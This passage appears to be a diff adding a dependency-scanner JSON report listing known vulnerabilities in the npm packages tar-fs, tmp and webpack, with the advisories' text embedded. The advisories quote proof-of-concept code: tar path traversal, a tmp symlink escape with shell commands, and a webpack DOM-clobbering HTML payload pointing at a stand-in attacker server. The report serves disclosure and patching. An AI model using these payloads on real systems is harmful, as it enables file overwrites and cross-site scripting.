+              "modified": "2025-11-03T21:33:59Z",
+              "published": "2025-06-03T06:14:25Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/google/security-research/security/advisories/GHSA-xrg4-qp5w-2c3w"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/mafintosh/tar-fs/security/advisories/GHSA-8cj5-5rvv-wf4v"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-48387"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/mafintosh/tar-fs/commit/647447b572bc135c41035e82ca7b894f02b17f0f"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/mafintosh/tar-fs"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.debian.org/debian-lts-announce/2025/06/msg00012.html"
+                }
+              ],
+              "related": [
+                "CGA-55w6-xh69-4x9r",
+                "CGA-pf8m-56wg-hmgj",
+                "CGA-rwrq-vpx6-923w",
+                "CVE-2025-48387"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "tar-fs can extract outside the specified dir with a specific tarball"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-pq67-2wwv-3xjx/GHSA-pq67-2wwv-3xjx.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.16.4"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-pq67-2wwv-3xjx/GHSA-pq67-2wwv-3xjx.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.1.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-pq67-2wwv-3xjx/GHSA-pq67-2wwv-3xjx.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.0.7"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2024-12905"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-03-28T22:11:42Z",
+                "nvd_published_at": "2025-03-27T17:15:53Z",
+                "severity": "HIGH"
+              },
+              "details": "An Improper Link Resolution Before File Access (\"Link Following\") and Improper Limitation of a Pathname to a Restricted Directory (\"Path Traversal\"). This vulnerability occurs when extracting a maliciously crafted tar file, which can result in unauthorized file writes or overwrites outside the intended extraction directory. The issue is associated with index.js in the tar-fs package.\n\nThis issue affects tar-fs: from 0.0.0 before 1.16.4, from 2.0.0 before 2.1.2, from 3.0.0 before 3.0.7.\n\n### PoC\n```javascript\n// Create a writable stream to extract the tar content\nconst extractStream = tarfs.extract('/', {\n    // We can ignore the file type checks to allow the extraction of the malicious file\n    ignore: (name) =\u003e false,\n});\n\n// Create a tar stream\nconst tarStream = tarfs.pack().on('error', (err) =\u003e {\n    throw err;\n});\n\n// Append the malicious entry to the tar stream\ntarStream.entry({ name: '/flag.txt', mode: 0o644 }, Buffer.from('This is a flag!'));\n\n// Finalize the tar stream\ntarStream.finalize();\n\n// Pipe the tar stream into the extract stream\ntarStream.pipe(extractStream);\n```",
+              "id": "GHSA-pq67-2wwv-3xjx",
+              "modified": "2025-11-03T22:54:57Z",
+              "published": "2025-03-27T18:31:28Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-12905"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://arxiv.org/abs/2506.04962"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://arxiv.org/pdf/2506.04962"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/mafintosh/tar-fs"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.debian.org/debian-lts-announce/2025/06/msg00012.html"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://www.seal.security/blog/a-link-to-the-past-uncovering-a-new-vulnerability-in-tar-fs"
+                }
+              ],
+              "related": [
+                "CGA-35gc-2rvw-x3vx",
+                "CGA-g3wm-3ppv-6g8v",
+                "CGA-r9fv-hjfx-7q5f",
+                "CGA-vpjj-p9g3-27hp"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "tar-fs Vulnerable to Link Following and Path Traversal via Extracting a Crafted tar File"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-vj76-c3g6-qr5v/GHSA-vj76-c3g6-qr5v.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.1.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-vj76-c3g6-qr5v/GHSA-vj76-c3g6-qr5v.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.1.4"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-vj76-c3g6-qr5v/GHSA-vj76-c3g6-qr5v.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tar-fs",
+                    "purl": "pkg:npm/tar-fs"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.16.6"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-59343"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22",
+                  "CWE-61"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-09-24T18:57:04Z",
+                "nvd_published_at": "2025-09-24T18:15:42Z",
+                "severity": "HIGH"
+              },
+              "details": "### Impact\n v3.1.0, v2.1.3, v1.16.5 and below\n\n### Patches\nHas been patched in 3.1.1, 2.1.4, and 1.16.6\n\n### Workarounds\nYou can use the ignore option to ignore non files/directories.\n\n```js\n  ignore (_, header) {\n    // pass files \u0026 directories, ignore e.g. symlinks\n    return header.type !== 'file' \u0026\u0026 header.type !== 'directory'\n  }\n```\n\n### Credit\nReported by: Mapta / BugBunny_ai",
+              "id": "GHSA-vj76-c3g6-qr5v",
+              "modified": "2025-11-03T21:34:35Z",
+              "published": "2025-09-24T18:57:04Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/mafintosh/tar-fs/security/advisories/GHSA-vj76-c3g6-qr5v"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-59343"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/mafintosh/tar-fs/commit/0bd54cdf06da2b7b5b95cd4b062c9f4e0a8c4e09"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/mafintosh/tar-fs"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.debian.org/debian-lts-announce/2025/09/msg00028.html"
+                }
+              ],
+              "related": [
+                "CGA-3xxp-rpv6-8q3v",
+                "CGA-629w-fchm-c48f",
+                "CGA-9rx8-9xvv-cx6w",
+                "CGA-jjrf-7cgq-346h",
+                "CGA-x8c2-72cm-877v"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "tar-fs has a symlink validation bypass if destination directory is predictable with a specific tarball"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "tmp",
+            "version": "0.2.3",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-52f5-9888-hmc6"
+              ],
+              "aliases": [
+                "CVE-2025-54798",
+                "GHSA-52f5-9888-hmc6"
+              ],
+              "max_severity": "2.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 0.2.3",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-52f5-9888-hmc6/GHSA-52f5-9888-hmc6.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "tmp",
+                    "purl": "pkg:npm/tmp"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.2.4"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-54798"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-59"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-08-06T17:06:04Z",
+                "nvd_published_at": "2025-08-07T01:15:26Z",
+                "severity": "LOW"
+              },
+              "details": "### Summary\n\n`tmp@0.2.3` is vulnerable to an Arbitrary temporary file / directory write via symbolic link `dir` parameter.\n\n\n### Details\n\nAccording to the documentation there are some conditions that must be held:\n\n```\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L41-L50\n\nOther breaking changes, i.e.\n\n- template must be relative to tmpdir\n- name must be relative to tmpdir\n- dir option must be relative to tmpdir //\u003c-- this assumption can be bypassed using symlinks\n\nare still in place.\n\nIn order to override the system's tmpdir, you will have to use the newly\nintroduced tmpdir option.\n\n\n// https://github.com/raszi/node-tmp/blob/v0.2.3/README.md?plain=1#L375\n* `dir`: the optional temporary directory that must be relative to the system's default temporary directory.\n     absolute paths are fine as long as they point to a location under the system's default temporary directory.\n     Any directories along the so specified path must exist, otherwise a ENOENT error will be thrown upon access, \n     as tmp will not check the availability of the path, nor will it establish the requested path for you.\n```\n\nRelated issue: https://github.com/raszi/node-tmp/issues/207.\n\n\nThe issue occurs because `_resolvePath` does not properly handle symbolic link when resolving paths:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L573-L579\nfunction _resolvePath(name, tmpDir) {\n  if (name.startsWith(tmpDir)) {\n    return path.resolve(name);\n  } else {\n    return path.resolve(path.join(tmpDir, name));\n  }\n}\n```\n\nIf the `dir` parameter points to a symlink that resolves to a folder outside the `tmpDir`, it's possible to bypass the `_assertIsRelative` check used in `_assertAndSanitizeOptions`:\n```js\n// https://github.com/raszi/node-tmp/blob/v0.2.3/lib/tmp.js#L590-L609\nfunction _assertIsRelative(name, option, tmpDir) {\n  if (option === 'name') {\n    // assert that name is not absolute and does not contain a path\n    if (path.isAbsolute(name))\n      throw new Error(`${option} option must not contain an absolute path, found \"${name}\".`);\n    // must not fail on valid .\u003cname\u003e or ..\u003cname\u003e or similar such constructs\n    let basename = path.basename(name);\n    if (basename === '..' || basename === '.' || basename !== name)\n      throw new Error(`${option} option must not contain a path, found \"${name}\".`);\n  }\n  else { // if (option === 'dir' || option === 'template') {\n    // assert that dir or template are relative to tmpDir\n    if (path.isAbsolute(name) \u0026\u0026 !name.startsWith(tmpDir)) {\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${name}\".`);\n    }\n    let resolvedPath = _resolvePath(name, tmpDir); //\u003c--- \n    if (!resolvedPath.startsWith(tmpDir))\n      throw new Error(`${option} option must be relative to \"${tmpDir}\", found \"${resolvedPath}\".`);\n  }\n}\n```\n\n\n### PoC\n\nThe following PoC demonstrates how writing a tmp file on a folder outside the `tmpDir` is possible.\nTested on a Linux machine.\n\n- Setup: create a symbolic link inside the `tmpDir` that points to a directory outside of it\n```bash\nmkdir $HOME/mydir1\n\nln -s $HOME/mydir1 ${TMPDIR:-/tmp}/evil-dir\n```\n\n- check the folder is empty:\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n```\n\n- run the poc\n```bash\nnode main.js\nFile:  /tmp/evil-dir/tmp-26821-Vw87SLRaBIlf\ntest 1: ENOENT: no such file or directory, open '/tmp/mydir1/tmp-[random-id]'\ntest 2: dir option must be relative to \"/tmp\", found \"/foo\".\ntest 3: dir option must be relative to \"/tmp\", found \"/home/user/mydir1\".\n```\n\n- the temporary file is created under `$HOME/mydir1` (outside the `tmpDir`):\n```bash\nls -lha $HOME/mydir1 | grep \"tmp-\"\n-rw------- 1 user user    0 Apr  X XX:XX tmp-[random-id]\n```\n\n\n- `main.js`\n```js\n// npm i tmp@0.2.3\n\nconst tmp = require('tmp');\n\nconst tmpobj = tmp.fileSync({ 'dir': 'evil-dir'});\nconsole.log('File: ', tmpobj.name);\n\ntry {\n    tmp.fileSync({ 'dir': 'mydir1'});\n} catch (err) {\n    console.log('test 1:', err.message)\n}\n\ntry {\n    tmp.fileSync({ 'dir': '/foo'});\n} catch (err) {\n    console.log('test 2:', err.message)\n}\n\ntry {\n    const fs = require('node:fs');\n    const resolved = fs.realpathSync('/tmp/evil-dir');\n    tmp.fileSync({ 'dir': resolved});\n} catch (err) {\n    console.log('test 3:', err.message)\n}\n```\n\n\nA Potential fix could be to call `fs.realpathSync` (or similar) that resolves also symbolic links.\n```js\nfunction _resolvePath(name, tmpDir) {\n  let resolvedPath;\n  if (name.startsWith(tmpDir)) {\n    resolvedPath = path.resolve(name);\n  } else {\n    resolvedPath = path.resolve(path.join(tmpDir, name));\n  }\n  return fs.realpathSync(resolvedPath);\n}\n```\n\n\n### Impact\n\nArbitrary temporary file / directory write via symlink",
+              "id": "GHSA-52f5-9888-hmc6",
+              "modified": "2025-11-03T21:34:20Z",
+              "published": "2025-08-06T17:06:04Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/raszi/node-tmp/security/advisories/GHSA-52f5-9888-hmc6"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-54798"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/raszi/node-tmp/issues/207"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/raszi/node-tmp/commit/188b25e529496e37adaf1a1d9dccb40019a08b1b"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/raszi/node-tmp"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.debian.org/debian-lts-announce/2025/08/msg00007.html"
+                }
+              ],
+              "related": [
+                "CGA-24xq-h2j3-3x86",
+                "CGA-6p3x-59vm-9fq8"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "tmp allows arbitrary temporary file / directory write via symbolic link `dir` parameter"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "webpack",
+            "version": "5.91.0",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-4vvj-4cpr-p986"
+              ],
+              "aliases": [
+                "CVE-2024-43788",
+                "GHSA-4vvj-4cpr-p986"
+              ],
+              "max_severity": "6.4"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-4vvj-4cpr-p986/GHSA-4vvj-4cpr-p986.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "webpack",
+                    "purl": "pkg:npm/webpack"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "5.0.0-alpha.0"
+                        },
+                        {
+                          "fixed": "5.94.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2024-43788"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-79"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-08-27T19:50:40Z",
+                "nvd_published_at": "2024-08-27T17:15:07Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\nWe discovered a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.\n\nWe found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpack’s code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.\n\n\n### Details\n\n#### Backgrounds\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https://scnps.co/papers/sp23_domclob.pdf\n[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/\n\n\n#### Gadgets found in Webpack\n\nWe identified a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. When the `output.publicPath` field in the configuration is not set or is set to `auto`, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:\n\n```\n/******/ \t/* webpack/runtime/publicPath */\n/******/ \t(() =\u003e {\n/******/ \t\tvar scriptUrl;\n/******/ \t\tif (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + \"\";\n/******/ \t\tvar document = __webpack_require__.g.document;\n/******/ \t\tif (!scriptUrl \u0026\u0026 document) {\n/******/ \t\t\tif (document.currentScript)\n/******/ \t\t\t\tscriptUrl = document.currentScript.src;\n/******/ \t\t\tif (!scriptUrl) {\n/******/ \t\t\t\tvar scripts = document.getElementsByTagName(\"script\");\n/******/ \t\t\t\tif(scripts.length) {\n/******/ \t\t\t\t\tvar i = scripts.length - 1;\n/******/ \t\t\t\t\twhile (i \u003e -1 \u0026\u0026 (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;\n/******/ \t\t\t\t}\n/******/ \t\t\t}\n/******/ \t\t}\n/******/ \t\t// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration\n/******/ \t\t// or pass an empty string (\"\") and set the __webpack_public_path__ variable from your code to use your own logic.\n/******/ \t\tif (!scriptUrl) throw new Error(\"Automatic publicPath is not supported in this browser\");\n/******/ \t\tscriptUrl = scriptUrl.replace(/#.*$/, \"\").replace(/\\?.*$/, \"\").replace(/\\/[^\\/]+$/, \"/\");\n/******/ \t\t__webpack_require__.p = scriptUrl;\n/******/ \t})();\n```\n\nHowever, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with `document.currentScript` can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the `src` attribute of the attacker-controlled element will be used as the `scriptUrl` and assigned to `__webpack_require__.p`. If additional scripts are loaded from the server, `__webpack_require__.p` will be used as the base URL, pointing to the attacker's domain. This could lead to arbitrary script loading from the attacker's server, resulting in severe security risks.\n\n### PoC\n\nPlease note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I’m providing a demo to illustrate the concept.\n\nConsider a website developer with the following two scripts, `entry.js` and `import1.js`, that are compiled using Webpack:\n\n```\n// entry.js\nimport('./import1.js')\n  .then(module =\u003e {\n    module.hello();\n  })\n  .catch(err =\u003e {\n    console.error('Failed to load module', err);\n  });\n```\n\n```\n// import1.js\nexport function hello () {\n  console.log('Hello');\n}\n```\n\nThe webpack.config.js is set up as follows:\n```\nconst path = require('path');\n\nmodule.exports = {\n  entry: './entry.js', // Ensure the correct path to your entry file\n  output: {\n    filename: 'webpack-gadgets.bundle.js', // Output bundle file\n    path: path.resolve(__dirname, 'dist'), // Output directory\n    publicPath: \"auto\", // Or leave this field not set\n  },\n  target: 'web',\n  mode: 'development',\n};\n```\n\nWhen the developer builds these scripts into a bundle and adds it to a webpage, the page could load the `import1.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n```\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n  \u003ctitle\u003eWebpack Example\u003c/title\u003e\n  \u003c!-- Attacker-controlled Script-less HTML Element starts--!\u003e\n  \u003cimg name=\"currentScript\" src=\"https://attacker.controlled.server/\"\u003e\u003c/img\u003e\n  \u003c!-- Attacker-controlled Script-less HTML Element ends--!\u003e\n\u003c/head\u003e\n\u003cscript src=\"./dist/webpack-gadgets.bundle.js\"\u003e\u003c/script\u003e\n\u003cbody\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n### Impact\n\nThis vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.\n\n### Patch\n\nA possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174\n\n```\n/******/ \t/* webpack/runtime/publicPath */\n/******/ \t(() =\u003e {\n/******/ \t\tvar scriptUrl;\n/******/ \t\tif (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + \"\";\n/******/ \t\tvar document = __webpack_require__.g.document;\n/******/ \t\tif (!scriptUrl \u0026\u0026 document) {\n/******/ \t\t\tif (document.currentScript \u0026\u0026 document.currentScript.tagName.toUpperCase() === 'SCRIPT') // Assume attacker cannot control script tag, otherwise it is XSS already :\u003e\n/******/ \t\t\t\tscriptUrl = document.currentScript.src;\n/******/ \t\t\tif (!scriptUrl) {\n/******/ \t\t\t\tvar scripts = document.getElementsByTagName(\"script\");\n/******/ \t\t\t\tif(scripts.length) {\n/******/ \t\t\t\t\tvar i = scripts.length - 1;\n/******/ \t\t\t\t\twhile (i \u003e -1 \u0026\u0026 (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;\n/******/ \t\t\t\t}\n/******/ \t\t\t}\n/******/ \t\t}\n/******/ \t\t// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration\n/******/ \t\t// or pass an empty string (\"\") and set the __webpack_public_path__ variable from your code to use your own logic.\n/******/ \t\tif (!scriptUrl) throw new Error(\"Automatic publicPath is not supported in this browser\");\n/******/ \t\tscriptUrl = scriptUrl.replace(/#.*$/, \"\").replace(/\\?.*$/, \"\").replace(/\\/[^\\/]+$/, \"/\");\n/******/ \t\t__webpack_require__.p = scriptUrl;\n/******/ \t})();\n```\n\nPlease note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent.",
+              "id": "GHSA-4vvj-4cpr-p986",
+              "modified": "2025-07-29T11:26:59.611456Z",
+              "published": "2024-08-27T19:50:40Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-43788"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/webpack/webpack/issues/18718#issuecomment-2326296270"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/webpack/webpack/commit/955e057abc6cc83cbc3fa1e1ef67a49758bf5a61"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/webpack/webpack"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://research.securitum.com/xss-in-amp4email-dom-clobbering"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://scnps.co/papers/sp23_domclob.pdf"
+                }
+              ],
+              "related": [
+                "CGA-9rjf-f92q-2cm7",
+                "CGA-h43v-8hrp-cpgc",
+                "CGA-v955-45j8-9w79",
+                "CVE-2024-45389",
+                "CVE-2024-45812"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:L/VI:L/VA:H/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Webpack's AutoPublicPathRuntimeModule has a DOM Clobbering Gadget that leads to XSS"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "experimental_config": {
+    "licenses": {
+      "summary": false,
+      "allowlist": null
+    }
+  }
+}
